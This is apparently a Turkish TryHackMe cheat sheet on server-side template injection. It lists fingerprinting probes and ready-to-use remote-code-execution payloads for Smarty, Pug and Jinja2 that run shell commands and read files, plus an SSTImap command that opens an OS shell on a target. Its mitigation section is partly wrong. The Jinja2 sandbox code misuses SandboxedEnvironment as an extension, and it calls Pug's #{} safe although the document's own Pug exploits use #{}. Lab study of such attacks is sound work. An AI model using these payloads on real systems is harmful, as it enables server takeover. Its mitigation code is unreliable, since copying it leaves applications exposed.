# TryHackMe: Server-Side Template Injection (SSTI) - Cheat Sheet

Bu belge, web uygulamalarındaki Şablon Motoru (Template Engine) zafiyetlerini tespit etme, sömürme (RCE) ve bu zafiyetlere karşı güvenli kodlama (Mitigation) yöntemlerini özetler.

## 🧠 1. SSTI Nedir?
SSTI (Sunucu Taraflı Şablon Enjeksiyonu), web sitelerinin dinamik içerik oluşturmak için kullandığı şablon motorlarının (Jinja2, Twig, Pug vb.), kullanıcıdan gelen verileri "metin" yerine "çalıştırılabilir kod" olarak algılamasıyla oluşan kritik bir zafiyettir. 
* **Etkisi (Impact):** Genellikle doğrudan **RCE (Uzaktan Kod Çalıştırma)** ile sonuçlanır ve sunucunun tamamen ele geçirilmesine yol açar.

---

## 🕵️‍♂️ 2. Keşif ve Şablon Motoru Tespiti (Fingerprinting)
SSTI zafiyetini sömürmeden önce arka planda hangi dilin/motorun çalıştığını tespit etmek şarttır. Zafiyetli olduğu düşünülen bir girdi alanına (parametre veya form) şu matematiksel "tuzaklar" gönderilir:

| Payload | Çıktı (Response) | Şablon Motoru (Template Engine) |
| :--- | :--- | :--- |
| `{{7*7}}` | `49` | Twig (PHP), Smarty (PHP) veya Jinja2 (Python) olabilir. |
| `{{7*'7'}}` | `49` | **Twig** veya **Smarty** (PHP) (Metni sayıya çevirir ve çarpar). |
| `{{7*'7'}}` | `7777777` | **Jinja2** (Python) (Metni 7 kez yan yana yazar). |
| `#{7*7}` | `49` | **Pug / Jade** (Node.js). |

---

## 💥 3. İstismar (Exploitation) ve RCE Payloadları

### A. Smarty (PHP)
Smarty, şablon içinden PHP fonksiyonlarının çağrılmasına izin veriyorsa zafiyetlidir.
* **Test (Doğrulama):** `{'Hello'|upper}` (Ekranda `HELLO` yazar).
* **RCE (Komut Çalıştırma - Dizin Listeleme):**
  ```smarty
  {system("ls -lah")}

    Dosya Okuma:
    Kod snippet'i

    {system("cat .gizli_dosya.txt")}

B. Pug / Jade (Node.js)

#{} sembolleri arasına yazılan her şeyi JavaScript kodu olarak çalıştırır.

    Kritik Kural: Komut (ls) ve argümanları (-lah) Node.js arka planında çökmemesi için bir Dizi (Array) olarak ayrılmalıdır.

    RCE (Komut Çalıştırma - Dizin Listeleme):
    Kod snippet'i

    #{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}

    Dosya Okuma:
    Kod snippet'i

    #{root.process.mainModule.require('child_process').spawnSync('cat', ['.gizli_dosya.txt']).stdout}

C. Jinja2 (Python)

Python'un nesne yapısını kullanarak "Sandbox" (Kum Havuzu) içinden çıkıp işletim sistemine komut gönderen subprocess modülüne ulaşılır.

    Kritik Kural: Komutlar ve argümanlar liste içinde verilmelidir. (Not: [157] index numarası hedefin Python sürümüne göre değişiklik gösterebilir).

    RCE (Komut Çalıştırma - Dizin Listeleme):
    Python

    {{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}

    Dosya Okuma:
    Python

    {{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['cat', '.gizli_dosya.txt'])}}

🤖 4. Otomasyon: SSTImap

SSTI zafiyetlerini manuel olarak tek tek denemek yerine, SQLMap benzeri otomatik bir sömürü aracıdır. Zafiyeti bulur ve doğrudan sistem terminali (shell) verir.

    Saldırı ve Shell Alma Komutu:
    Bash

    python3 sstimap.py -X POST -u '[http://hedef.com/mako/](http://hedef.com/mako/)' -d 'parametre_adi=' --os-shell

(Bu komut, parametre_adi isimli POST verisini zehirleyerek terminal erişimi sağlar).
🛡️ 5. Savunma ve Güvenli Kodlama (Mitigation)

SSTI'ı önlemenin temel yolu "Sandboxing" (Kum Havuzu) oluşturmak ve kullanıcı girdisinin kod olarak çalışmasını engellemektir.

    Jinja2 (Python): SandboxedEnvironment modülü kullanılmalı ve autoescape aktif edilmelidir. Tehlikeli sistem modüllerinin (os, subprocess) şablona aktarımı kesinlikle engellenmelidir.
    Python

    from jinja2 import Environment, select_autoescape, sandbox
    env = Environment(autoescape=select_autoescape(['html', 'xml']), extensions=[sandbox.SandboxedEnvironment])

    Pug / Jade (Node.js): Girdiler için ASLA !{} (filtresiz işleme) kullanılmamalıdır. Her zaman otomatik HTML encode işlemi yapan ve zararlı karakterleri temizleyen #{} tercih edilmelidir.

    Smarty (PHP): Şablon içinde PHP kodu yazılmasını sağlayan eski nesil {php} tagları güvenlik politikası ile tamamen devre dışı bırakılmalıdır.
    PHP

    $smarty->security_policy->php_handling = Smarty::PHP_REMOVE;
